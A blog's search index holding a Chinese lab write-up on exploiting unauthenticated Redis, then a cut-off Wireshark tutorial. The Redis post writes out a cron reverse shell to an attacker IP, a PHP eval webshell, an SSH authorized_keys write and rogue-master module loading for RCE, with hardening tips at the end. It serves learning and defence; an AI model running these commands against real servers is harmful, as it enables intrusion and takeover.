<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>redis常见漏洞学习</title>
      <link href="/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="redis基础知识"><a href="#redis基础知识" class="headerlink" title="redis基础知识"></a>redis基础知识</h1><p>redis是一个非常快速的、开源的、支持网络、可基于内存亦可持久化的日志型、非关系类型的.Key-Value数据库，并提供多种语言的API。它提供了Java，C&#x2F;C++，C#，PHP，JavaScript，PerlObject-C，Python，Ruby，Erlang等客户端，使用很方便。</p><p>与MySQL数据库不同的是，Redis的数据是存在内存中的。它的读写速度非常快，每秒可以处理超过10万次读写操作。因此redis被广泛应用于缓存，另外，Redis也经常用来做分布式锁。除此之外，Redis支持事务、持久化、LUA 脚本、LRU 驱动事件、多种集群方案。</p><h2 id="一些常用的命令"><a href="#一些常用的命令" class="headerlink" title="一些常用的命令"></a>一些常用的命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">set xz &quot;Hacker&quot;          # 设置键xz的值为字符串Hacker<br>get xz                   # 获取键xz的内容<br>info                     # 获取服务器的各种信息和统计数据比如服务器当前的状态、统计信息、配置参数、客户端连接情况等，我们还可以获取特定信息，比如info memory只获取内存信息<br>SET score 857            # 设置键score的值为857<br>INCR score               # 使用INCR命令将score的值增加1<br>GET score                # 获取键score的内容<br>keys *                   # 列出当前数据库中所有的键<br>config set protected-mode no        # 关闭安全模式<br>get anotherkey                      # 获取一个不存在的键的值<br>config set dir /root/redis          # 设置保存目录<br>config set dbfilename redis.rdb     # 设置保存文件名<br>config get dir                      # 查看保存目录<br>config get dbfilename               # 查看保存文件名<br>save                                # 进行一次备份操作<br>flushall                            # 删除所有数据<br>del key                             # 删除键为key的数据<br>slaveof ip port                     # 设置主从关系<br>redis-cli -h ip -p 6379 -a passwd   # 外部连接<br>flushdb                             # 清空当前数据库的所有 key<br>module load /path/to/your/module.so # 用来加载自定义的模块文件，通常是so文件，/path/to/your/module.so 替换为你实际的模块文件路径<br>module list                         #列出已经加载的模块<br></code></pre></td></tr></table></figure><blockquote><p>不过module加载模块有些redis版本是不支持的</p></blockquote><h2 id="redis相关的数据库配置"><a href="#redis相关的数据库配置" class="headerlink" title="redis相关的数据库配置"></a>redis相关的数据库配置</h2><p>redis数据库相关的配置可以在**&#x2F;etc&#x2F;redis&#x2F;redis.conf**文件里面进行设置</p><p><strong>port</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330103644314.png" alt="image-20240330103644314"></p><p><strong>bind</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表允许192.168.1.100和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，就是白名单形式。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330103720889.png" alt="image-20240330103720889"></p><p><strong>save</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：<br>save 900 1<br>save 300 10<br>save 60 10000<br>表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330103908193.png" alt="image-20240330103908193"></p><p><strong>requirepass</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330104550773.png" alt="image-20240330104550773"></p><blockquote><p>默认不设置密码这也是未授权访问的重要原因</p></blockquote><p><strong>dir</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330104712001.png" alt="image-20240330104712001"></p><p><strong>dbfilename</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330104849575.png" alt="image-20240330104849575"></p><p><strong>config</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过config命令可以读取和设置dir参数以及dbfilename参数，后面很多攻击方式都会需要用到该命令，所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330105533934.png" alt="image-20240330105533934"></p><p><strong>protected-mode</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">redis3.2之后添加了protected-mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为no。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330105721000.png" alt="image-20240330105721000"></p><h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><p>redis未授权访问漏洞是一个由于redis服务版本较低其未设置登录密码导致的漏洞，攻击者可直接利用redis服务器的ip地址和端口完成redis服务器的远程登录，对目标服务器完成后续的控制和利用。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ol><li>redis版本为4.x&#x2F;5.0.5以前的版本</li><li>redis绑定在0.0.0.0:6379端口，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接博暴露在公网。</li><li>没有设置认证密码(一般为空)，可以免密码远程登陆redis服务。</li></ol><h2 id="漏洞导致的危害"><a href="#漏洞导致的危害" class="headerlink" title="漏洞导致的危害"></a>漏洞导致的危害</h2><ol><li>攻击者可以通过redis的命令来向目标服务器写入计划任务进行反弹shell</li><li>攻击者可以通过命令向网站目录写入webshell来进行控制网站服务器</li><li>最严重的情况，如果目标机器是以root身份登录的服务器并且开启了redis，黑客就可以直接利用该账号的权限写入SSH公钥文件，直接通过SSH登录受害者的服务器。</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>漏洞环境搭建</strong></p><p>这里我的受害机是ubuntu，攻击机是kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.直接安装redis<br>sudo apt install redis<br><br>2.关闭一下防火墙<br>iptables -F<br><br>3.将bind的绑定地址设定为0.0.0.0可以使其暴露在公网上面<br>bind 0.0.0.0<br><br>4.重启一下redis服务<br>systemctl restart redis<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330125500798.png" alt="image-20240330125500798"></p><p><strong>然后直接漏洞利用即可</strong></p><p>在攻击机上用redis-cli连接即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">redis-cli -h &lt;受害机的IP&gt; -p 6379<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330125617710.png" alt="image-20240330125617710"></p><p>下面就是一些利用该漏洞所进行的进一步攻击操作</p><h1 id="写入计划任务反弹shell"><a href="#写入计划任务反弹shell" class="headerlink" title="写入计划任务反弹shell"></a>写入计划任务反弹shell</h1><p><strong>计划任务相关文件的粗放位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/etc/crontab：这是系统范围的 cron 配置文件，其中包含了系统级别的计划任务的设置。<br><br>/etc/cron.d/：这个目录用于存放系统级别的 cron 任务配置文件。<br><br>/etc/cron.daily/：该目录包含了每日执行的计划任务。<br><br>/etc/cron.weekly/：这个目录用于存放每周执行的计划任务。<br><br>/etc/cron.monthly/：包含了每月执行的计划任务。<br><br>/var/spool/cron/ 或 /var/spool/cron/crontabs/：这个目录通常包含用户特定的 crontab 文件，用户可以在其中定义自己的计划任务。<br><br>用户家目录下的 .crontab 或 .cronjobs：用户可以在自己的家目录下创建名为 .crontab 或 .cronjobs 的文件，以定义自己的计划任务。<br></code></pre></td></tr></table></figure><p>这里再了解一下计划任务的写入形式，当我们crontab -e写入计划任务的时候，会在计划任务的目录下创建一个以用户名命名的文件，所以我们等会redis写入文件时保存的文件名也要是以用户名命名的文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330132520323.png" alt="image-20240330132520323"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330132538445.png" alt="image-20240330132538445"></p><p><strong>写入计划任务</strong></p><p>利用思路：</p><p>我们连接之后就要利用config修改文件的保存路径为计划任务的路径，然后写入计划任务（emmm写入失败了，说权限不够，可能是ubuntu用了普通用户启动redis，但是Ubuntu换root登录又要折腾，我这里直接换centos了）</p><p>&#x3D;&#x3D;centos安装redis&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs shelll">yum update #更新安装包<br>yum install epel-release # 安装 EPEL 软件库：Redis 软件包通常在 EPEL 软件库中<br>yum install redis<br>sudo systemctl start redis #启动redis服务<br>sudo systemctl enable redis # 用于设置开机自启动，看需求选择<br></code></pre></td></tr></table></figure><p>然后和上面一样修改配置文件，centos的redis配置文件的路径为&#x2F;etc&#x2F;redis.conf</p><p>然后再关一下防火墙</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">iptables -F<br>setenforce 0  # 改变SELinux的工作模式，SELinux是一种在 Linux 操作系统上实现强制访问控制（MAC）的安全机制；<br>systemctl stop firewalld.service #centos中特有的防火墙<br></code></pre></td></tr></table></figure><blockquote><p>SELinux有三种工作模式：</p><ol><li>Enforcing Mode（强制模式）：在这个模式下，SELinux会强制执行所有定义的安全策略，如果有违反策略的操作发生，会被阻止并记录到日志中。在强制模式下，SELinux会严格限制系统资源的访问。表示为1</li><li>Permissive Mode（宽容模式）：在这个模式下，SELinux会记录违反安全策略的操作，但不会阻止它们，这样可以帮助管理员了解哪些操作可能会违反策略。这个模式类似于监控模式。表示为0</li><li>Disabled Mode（禁用模式）：在这个模式下，SELinux完全被禁用，系统不会应用任何SELinux的安全策略。要设置关闭的话就需要修改”&#x2F;etc&#x2F;sysconfig&#x2F;selinux”配置文件</li></ol><p>可以使用getenforce查看当前工作模式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330141233651.png" alt="image-20240330141233651"></p></blockquote><blockquote><p>又写不进去还是会报下面的错我就奇怪了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330143126682.png" alt="image-20240330143126682"></p><p>去搜了搜发现即使为root身份，redis他自己也不是以root身份登录的，要从配置文件启动才能以root身份登录，坑死了，所以要先systemctl stop redis来停掉redis服务，要我们来自己启动</p><p>&#x2F;usr&#x2F;bin&#x2F;redis-server &#x2F;etc&#x2F;redis.conf  &#x2F;&#x2F;直接redis-server启动会开启保护模式也改不了目录</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330143530956.png" alt="image-20240330143530956"></p><p>然后终于可以愉快地写计划任务了</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron   #这个要看具体系统的目录<br>config set dbfilename root<br>set xxoo &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;攻击者ip&gt;/&lt;监听端口&gt; 0&gt;&amp;1\n\n&quot; #这里的换行是为了保证格式正确，如果目标机器上有很多的计划任务可能会导致写入的反弹sehll格式错误。<br>save  #进行一次备份来写入文件当中<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330143734305.png" alt="image-20240330143734305"></p><p>然后<strong>nc -lvvp 6666</strong>开启监听等待即可</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330144612655.png" alt="image-20240330144612655"></p><p>反弹shell成功，可以看一下我们写进去的计划任务长什么样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330144654223.png" alt="image-20240330144654223"></p><h1 id="写入webshell控制服务器"><a href="#写入webshell控制服务器" class="headerlink" title="写入webshell控制服务器"></a>写入webshell控制服务器</h1><ol><li>这里我们先用centos快速搭建一个LAMP的环境用于解析我们上传的php一句话木马</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装apache服务器</span><br>sudo yum install httpd<br>sudo systemctl start httpd<br>sudo systemctl enable httpd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装mysql数据库</span><br>sudo yum install mysql mysql-server<br>sudo systemctl start mysqld<br>sudo systemctl enable mysqld<br>sudo mysql_secure_installation # MySQL 提供的实用工具，用于执行一些安全设置和配置以加固 MySQL 数据库的安全性<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装php</span><br>sudo yum install php php-mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>开始写入我们的webshell</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/www/html<br>config set dbfilename shell.php<br>set shell &quot;&lt;?php eval($_POST[shell])?&gt;&quot;<br>save<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330150154116.png" alt="image-20240330150154116"></p><p>然后我们去访问一下shell.php</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330150249714.png" alt="image-20240330150249714"></p><p>上面的内容是我们上次设置的定时任务数据，一起save了进去，接下来用蚁剑去连接一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330150436847.png" alt="image-20240330150436847"></p><p>连接成功可以看到目录下的文件</p><h1 id="写入ssh-keygen公钥登录服务器漏洞"><a href="#写入ssh-keygen公钥登录服务器漏洞" class="headerlink" title="写入ssh-keygen公钥登录服务器漏洞"></a>写入ssh-keygen公钥登录服务器漏洞</h1><p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p><p>密钥验证就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p><ol><li>客户端生成私钥和公钥，将公钥拷贝给服务器端</li><li>客户端发起登录请求</li><li>服务器端根据客户端发来的信息查找是否存有该客户端的公钥，</li><li>客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证</li><li>服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对</li></ol><p><strong>攻击者本地生成密钥对</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  # 在家目录的.ssh下进行生成<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330151056696.png" alt="image-20240330151056696"></p><p><strong>向受害者机器写入公钥</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>set x &quot;\n\n\n&lt;生成的公钥&gt;\n\n\n&quot;  #换行是为了避免和其他数据混合保证格式正确，和上面的计划任务一样<br>save<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330151540903.png" alt="image-20240330151540903"></p><p>然后使用ssh登录目标机器，在.ssh目录下用私钥登录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh -i id_rsa root@&lt;目标机器ip&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330151831267.png" alt="image-20240330151831267"></p><p>成功登录！</p><h1 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h1><p><strong>主从复制介绍</strong></p><p>主从复制的传输分为全量传输和增量传输，这里的重点是全量传输：全量传输是将数据库备份文件整个传输过去，然后从节点清空内存数据库，将备份文件加载到数据库中。</p><p>这里从别人的文章偷个流程图方便理解：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330225328187.png" alt="image-20240330225328187"></p><p><strong>漏洞原理</strong></p><p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令,通过写c语言并编译出,so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNG同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p><blockquote><p>因为redis可以加载外部模块，而外部模块都是so文件的形式，可以使用编辑redis配置文件的方式来加载模块，文件里面也给了我们示例</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330170245773.png" alt="image-20240330170245773"></p></blockquote><p><strong>漏洞利用</strong></p><p>漏洞利用我们需要用到下面的两个工具</p><ul><li>redis-rogue-server：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> ，该工具无法对Redis密码进行Redis认证，也就是该工具只适合存在未授权访问漏洞的时候使用；如果存在密码就用下面的工具</li><li>Awsome-Redis-Rogue-Server：<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></li></ul><h2 id="使用第一个工具远程主从复制RCE"><a href="#使用第一个工具远程主从复制RCE" class="headerlink" title="使用第一个工具远程主从复制RCE"></a>使用第一个工具远程主从复制RCE</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis-rogue-server.py --rhost  --rport  --lhost  --lport <br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-–rpasswd 如果目标 Redis 服务开启了认证功能，可以通过该选项指定密码(没尝试过不知道行不行)<br><br>-–rhost 目标 redis 服务 IP<br><br>-–rport 目标 redis 服务端口，默认为 6379<br><br>-–lhost vps 的 IP 地址<br><br>-–lport vps 的端口，默认为 21000<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330171342499.png" alt="image-20240330171342499"></p><p>可以看到已经成功访问，我们可以用i选择一个交互式shell或者r反弹一个shell(这时候要再开启一个监听端口)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330171502308.png" alt="image-20240330171502308"></p><p>emmm这个交互式的shell好像有点拉，接下来换反弹shell试试，发现弹不了失败了，感觉是我本地安装的redis版本过高了，这个脚本的使用版本是&lt;&#x3D;5.0.5，然后取volfocus开了一个5.0版本的环境就成功了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330223708742.png" alt="image-20240330223708742"></p><p>可以看到成功反弹了一个shell回来，这是后我们还可以用python来生成一个交互式的shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>不过开的这个容器没有python生成不了（</p></blockquote><h2 id="本地Redis主从复制RCE反弹shell"><a href="#本地Redis主从复制RCE反弹shell" class="headerlink" title="本地Redis主从复制RCE反弹shell"></a>本地Redis主从复制RCE反弹shell</h2><p><strong>漏洞原理：</strong>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p><p>步骤可以总结如下：</p><ul><li>第一步，我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。</li><li>第二步，我们设置备份文件名为so文件</li><li>第三步，设置传输方式为全量传输</li><li>第四步，加载恶意so文件，实现任意命令执行</li></ul><blockquote><p>我们需要将redis-rogue-server的exp.so复制到Awsome-Redis-Rogue-Server的目录下进行使用，因为他的exp.so是带system模块的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330230929601.png" alt="image-20240330230929601"></p></blockquote><p>攻击机先执行下面的命令伪造一个master</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis_rogue_server.py -v -path exp.so<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330232215843.png" alt="image-20240330232215843"></p><p>我们连接上受害者机器之后执行下面的命令修改一下文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /tmp #一般/tmp目录都有权限写入，所以选择这个目录写入<br>config set dbfilename exp.so  #设置导出文件名<br>slaveof &lt;我们伪造的主机master的ip&gt; &lt;端口号&gt; #进行主从同步，将恶意so文件写入到tmp目录<br>module load ./exp.so   #加载写入的恶意so文件模块<br>module list            #查看恶意so有没有加载成功，主要看有没有system模块<br>system.rev &lt;攻击者ip&gt; &lt;监听端口&gt;   #这样就可以反弹一个shell回来了<br></code></pre></td></tr></table></figure><p>可以先看一下我们同步之前是没有模块的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330232527628.png" alt="image-20240330232527628"></p><p>我们同步之后再看一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330233258551.png" alt="image-20240330233258551"></p><p>最后监听端口进行反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330233419607.png" alt="image-20240330233419607"></p><p>可以看到我们的当前目录就是在&#x2F;tmp下</p><h1 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h1><p>redis的安全设置：设置完毕，需要重新加载配置文件启动redis。</p><ol><li>绑定内网ip</li><li>requirepass设置redis密码</li><li>开启保护模式(protected-mode)</li><li>最好更改一下默认端口</li><li>单独为redis设置一个普通账号，启动redis</li></ol>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析学习</title>
      <link href="/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark的基本使用"><a href="#Wireshark的基本使用" class="headerlink" title="Wireshark的基本使用"></a>Wireshark的基本使用</h1><h2 id="基本界面介绍"><a href="#基本界面介绍" class="headerlink" title="基本界面介绍"></a>基本界面介绍</h2><p>点进去就是wireshark的主界面，包含主机上存在的流量文件和用于捕获流量的网卡</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215038242.png" alt="image-20240329215038242"></p><p><strong>工作界面</strong></p><p>这里选用了以太网网卡捕获了一些流量进行演示</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215342258.png" alt="image-20240329215342258"></p><p><strong>一些菜单栏</strong></p><ol><li><p>文件菜单</p><p>文件菜单主要负责打开已经抓取的数据包、最近打开的数据包合并数据包、导入导出特定数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215454613.png" alt="image-20240329215454613"></p></li><li><p>编辑菜单</p><p>编辑菜单主要负责对数据包分类标记，以及在抓包过程中按照时间大小进行分包存储，还有整个软件的首选项也在编辑菜单中。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215539889.png" alt="image-20240329215539889"></p></li><li><p>捕获菜单</p><p>捕获菜单用于设置捕获规则，其中选项菜单可以设置捕获的网卡，还可以设置捕获规则</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215720951.png" alt="image-20240329215720951"></p></li><li><p>分析菜单</p><p>分析菜单针对已经获取的数据包进行分析，通过制定相应的规则筛分数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215812146.png" alt="image-20240329215812146"></p></li><li><p>视图菜单</p><p>视图菜单主要是针对软件中的视图显示进行设置，重点需要关注的是解析名称、列显示中的着色规则。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215931362.png" alt="image-20240329215931362"></p></li><li><p>统计菜单</p><p>统计菜单可以通过对已有数据进行图形化数据分析，这个功能对于分析大量数据是非常有帮助的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329220025304.png" alt="image-20240329220025304"></p></li></ol><h2 id="数据包显示相关"><a href="#数据包显示相关" class="headerlink" title="数据包显示相关"></a>数据包显示相关</h2><p><strong>数据包显示列信息</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329220327142.png" alt="image-20240329220327142"></p><ol><li>No：编号，根据抓取的数据包自动分配</li><li>Time：时间，根据捕获时间设定该列</li><li>Source：源地址信息，如果数据包包含源地址信息比如：IP、MAC等，会显示在该列中</li><li>Destination：目的地址信息</li><li>Protocol：协议信息</li><li>Length：数据包长度信息</li><li>Info：wireshark对数据包解读的信息</li></ol><p><strong>修改显示列信息</strong></p><p>我们可以选择想要加入显示列的子项右击并选择应用为列，就可以在上面看到该列</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329220847712.png" alt="image-20240329220847712"></p><p>我们还可以删除已存在的显示列</p><p>我们还可以右击编辑列信息</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329221320578.png" alt="image-20240329221320578"></p><p><strong>修改显示列时间</strong></p><p>默认给出的时间格式不好阅读，我们也可以自己进行修改</p><p>我们可以单击视图选择想要的时间格式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329221446446.png" alt="image-20240329221446446"></p><p><strong>名字解析</strong></p><p>默认情况下Wireshark只开启了mac地址解析，如果有需要我们可以开启解析网络名称、解析传输层名称。</p><p>点击捕获，在捕获选项中进行修改，比如传输层就会将能识别的端口号解析成对应的服务名称，解析不了就显示原始端口号</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329221847219.png" alt="image-20240329221847219"></p><h2 id="数据包操作"><a href="#数据包操作" class="headerlink" title="数据包操作"></a>数据包操作</h2><p>获取数据包后用户可以对其进行标记、注释、合并、打印以及导出等操作，这里记录一些比较有用的操作</p><ol><li><p>标记数据包</p><p>标记数据包可以实现对比较重要的数据包进行标记，同时还可以修改数据包显示颜色。标记数据包的操作步骤如下:</p><p>在需要标记的数据包右击选择“标记&#x2F;取消标记”</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329222938030.png" alt="image-20240329222938030"></p><p>标记之后数据包就会高亮显示</p></li><li><p>添加注释操作</p><p>Wireshark提供对数据包注释的功能，在实际操作中如果感觉这个数据包有问题或者比较重要，可以添加一段注释信息</p><p>右击需要注释的数据包选择”分组注释”</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329223334679.png" alt="image-20240329223334679"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329223413212.png" alt="image-20240329223413212"></p></li><li><p>打印数据包</p><p>点击文件菜单选择打印</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329224124850.png" alt="image-20240329224124850"></p></li><li><p>合并数据包</p><p>在实际抓包过程中，如果网络流量比较大，不停止抓包操作，可能会出现抓包工具消耗掉所有内存，最终导致系统崩溃的状态。为解决这个问题，用户可以采取分段抓取，生成多个数据包文件，最后为了整体分析，再将这些分段数据包合并成一个包。</p><p>点击文件菜单选择合并，然后选择要合并的流量文件即可</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329223855934.png" alt="image-20240329223855934"></p></li><li><p>导出数据包</p><p>Wireshark提供了数据包导出功能，用户可以进行筛选导出，还可以通过分类导出，还可以只导出选中数据包</p><p>点击文件菜单选择导出特定分组</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329224400060.png" alt="image-20240329224400060"></p><p>还可以选择导出为不同格式</p></li></ol><h2 id="捕获选项"><a href="#捕获选项" class="headerlink" 